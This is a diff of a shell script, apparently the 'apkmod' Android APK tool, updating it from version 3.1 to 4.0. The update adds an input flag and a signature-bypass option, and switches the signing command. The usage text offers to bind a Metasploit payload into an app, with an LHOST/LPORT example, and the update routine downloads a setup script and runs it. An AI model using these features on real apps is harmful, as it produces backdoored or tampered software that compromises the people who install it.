@@ -8,7 +8,7 @@
 
 unset _JAVA_OPTIONS
 CWD=$(pwd)
-VERSION="3.1"
+VERSION="4.0"
 #AAPT=""
 
 #colors
@@ -23,28 +23,31 @@ reset='\033[0m'
 usage() {
 	printf "${yellow}Usage: apkmod [option] [/path/to/input.apk] -o [/path/to/output.apk] [EXTRAARGS]
     ${purple}valid options are:${blue}
-    -v              print version
-    -a              use aapt instead of aapt2
-    -d              For decompiling
-    -r              For recompiling
-    -R              recompile + sign
-    -s              For signing
-    -b              For binding payload
-    -o              Specify output file or directory
-    -V              verbose output
-    -z              for zipalign
-    --appname       change app name
-    --no-res        prevents decompiling of resources
-    --no-smali      prevents dessambly of dex files
-    --no-assets     prevents decoding of unknown assets file
-    --frame-path    The folder location where
-    framework files should be stored/read from
-    --enable-perm   Enable all permissions in binded payload
-    --to-java       Decode [dex,apk,zip] to java
-    --deobf         Can use along with --to-java for obfuscated code
+    -v                  print version
+    -a                  use aapt instead of aapt2
+    -d                  For decompiling
+    -r                  For recompiling
+    -R                  recompile + sign
+    -s                  For signing
+    -b                  For binding payload
+    -i                  Specify input file or directory
+    -o                  Specify output file or directory
+    -V                  verbose output
+    -z                  for zipalign
+    --appname           change app name
+    --no-res            prevents decompiling of resources
+    --no-smali          prevents dessambly of dex files
+    --no-assets         prevents decoding of unknown assets file
+    --frame-path        The folder location where framework files should be stored/read from
+    --enable-perm       Enable all permissions in binded payload
+    --to-java           Decode [dex,apk,zip] to java
+    --deobf             Can use along with --to-java for obfuscated code
+    --signature-bypass  Bypass signature verification
+
     ${yellow}Example:
-    ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444
+    ${blue}apkmod -b -i /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444
     ${purple}bind the payload with play.apk and saves output in given directory.
+
     ${green}Apkmod is like a bridge between your termux and 
     alpine by which you can easily decompile recompile signapk and 
     even bind the payload using metasploit\n${reset}"
@@ -100,7 +103,7 @@ decompile() {
 	if [ "${VERBOSE}" = "yes" ]; then
 		vbs_arg="-v"
 	fi
-	apktool ${NO_ASSETS} ${NO_RES} ${NO_SMALI} ${vbs_arg} d ${3} ${1} -o ${2} -p ${FRAMEPATH:-$HOME/.apkmod/framework}
+	apktool ${FORCE_DELETE} ${NO_ASSETS} ${NO_RES} ${NO_SMALI} ${vbs_arg} d ${3} ${1} -o ${2} -p ${FRAMEPATH:-$HOME/.apkmod/framework}
 	rm -f $HOME/.apkmod/framework/1.apk
 	if [ ! -e ${2} ]; then
 		error_msg "Can't decompile, take screenshot and open a issue on github"
@@ -136,8 +139,8 @@ recompile() {
 signApk() {
 	print_status "Signing ${1}"
 
-	#apksigner sign --in $1 --out $2 --ks-type PKCS12 --ks ~/.apkmod/apkmod.p12 --ks-pass pass:apkmod
-	signapk -signedjar $2 -storepass hax4us -sigalg SHA1withRSA -digestalg SHA1 -keystore \$HOME/apkmod.keystore $1 hax4us
+	apksigner sign --in $1 --out $2 --ks-type PKCS12 --ks ~/.apkmod/apkmod.p12 --ks-pass pass:apkmod
+	#signapk -signedjar $2 -storepass hax4us -sigalg SHA1withRSA -digestalg SHA1 -keystore \$HOME/apkmod.keystore $1 hax4us
 
 	if [ ! -e ${2} ]; then
 		error_msg "Can't sign, take screenshot and open a issue on github"
@@ -185,11 +188,21 @@ dextojava() {
 	jadx -d $2 $1 $DEOBF $NO_RES $NO_SRC
 }
 
+signature_bypass() {
+    print_status "Killing signature..."
+    signkill --killer $SIGNATURE_KILLER -i $1 -o $2
+}
+
 #########################
 # Validate User's input #
 #########################
 
 validate_input() {
+    if [ ! "${2}" ]; then
+        print_status "-i parameter missing, no input specified"
+        exit 1
+    fi
+
 	if [ "${1}" = "-b" ]; then
 		if [ "$#" -ne 5 ]; then
 			usage
@@ -198,18 +211,26 @@ validate_input() {
 		file_exist "${2}"
 		dir_exist "${3%\/*}"
 	fi
-	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
-		usage
-		exit 1
-	fi
+	#if [ ! "${1}" = "-b" -a "$#" -ne 4 ]; then
+	#	usage
+	#	exit 1
+	#fi
 
-	if [ "${1}" = "-d" -o "${1}" = "-s" -o "${1}" = "--enable-perm" -o "$1" = "-d2j" -o "$1" = "--appname" ]; then
+	if [ "${1}" = "-d" -o "${1}" = "-s" -o "${1}" = "--enable-perm" -o "$1" = "-d2j" -o "$1" = "--appname" -o "${1}" = "--signature-bypass" ]; then
 		file_exist "${2}"
 		dir_exist "${3%\/*}"
 	fi
+
 	if [ "${1}" = "-r" ]; then
 		dir_exist "${2}"
 		dir_exist "${3%\/*}"
+	fi
+
+	if [ "${1}" = "--signature-bypass" ]; then
+	    if [ ! "$SIGNATURE_KILLER" ]; then
+	        print_status "--killer value can't be empty"
+	        exit 1
+	    fi
 	fi
 }
 
@@ -231,7 +252,7 @@ update() {
 		else
 			ARGS=--without-alpine
 		fi
-		wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh $ARGS
+		wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && bash setup.sh $ARGS
 	fi
 }
 
@@ -250,7 +271,7 @@ if [ $# -eq 0 ]; then
     exit 1
 fi
 
-while getopts ":z:d:r:s:b:o:i:ahvuVR:-:f" opt; do
+while getopts ":z:drsbo:i:ahvuVR-:f" opt; do
     case $opt in
         a)
             USE_AAPT="yes"
@@ -258,24 +279,23 @@ while getopts ":z:d:r:s:b:o:i:ahvuVR:-:f" opt; do
         d)
             ACTION="decompile"
             ARG="-d"
-            in_abs_path=$(readlink -m ${OPTARG})
             ;;
         r)
             ACTION="recompile"
             ARG="-r"
-            in_abs_path=$(readlink -m ${OPTARG})
             ;;
         s)
             ACTION="signApk"
             ARG="-s"
-            in_abs_path=$(readlink -m ${OPTARG})
             ;;
         b)
             ACTION="bindapk"
             ARG="-b"
-            in_abs_path=$(readlink -m ${OPTARG})
             LHOST=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LHOST | cut -d "=" -f2)
             LPORT=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LPORT | cut -d "=" -f2)
+            ;;
+        i)
+            in_abs_path=$(readlink -m ${OPTARG})
             ;;
         o)
             out_abs_path=$(readlink -m ${OPTARG})
@@ -314,7 +334,6 @@ while getopts ":z:d:r:s:b:o:i:ahvuVR:-:f" opt; do
                 enable-perm*)
                     ACTION="enable_perm"
                     ARG="--enable-perm"
-                    in_abs_path=$(readlink -m ${OPTARG#*=})
                     ;;
                 deobf)
                     DEOBF="--deobf"
@@ -322,12 +341,16 @@ while getopts ":z:d:r:s:b:o:i:ahvuVR:-:f" opt; do
                 to-java*)
                     ACTION="dextojava"
                     ARG="-d2j"
-                    in_abs_path=$(readlink -m ${OPTARG#*=})
                     ;;
                 appname*)
                     ACTION="change_appname"
                     ARG="--appname"
                     APPNAME="${OPTARG#*=}"
+                    ;;
+                signature-bypass)
+                    ACTION="signature_bypass"
+                    ARG="--signature-bypass"
+                    SIGNATURE_KILLER=$(echo "$@" | sed -e "s/ /\\n/g" | grep "\--killer" | cut -d "=" -f2)
                     ;;
             esac
             ;;
@@ -376,6 +399,8 @@ elif [ "${ARG}" = "--enable-perm" ]; then
 elif [ "$ARG" = "-d2j" ]; then
     validate_input $ARG $in_abs_path $out_abs_path
 elif [ "$ARG" = "--appname" ]; then
+    validate_input $ARG $in_abs_path $out_abs_path
+elif [ "$ARG" = "--signature-bypass" ]; then
     validate_input $ARG $in_abs_path $out_abs_path
 fi
 
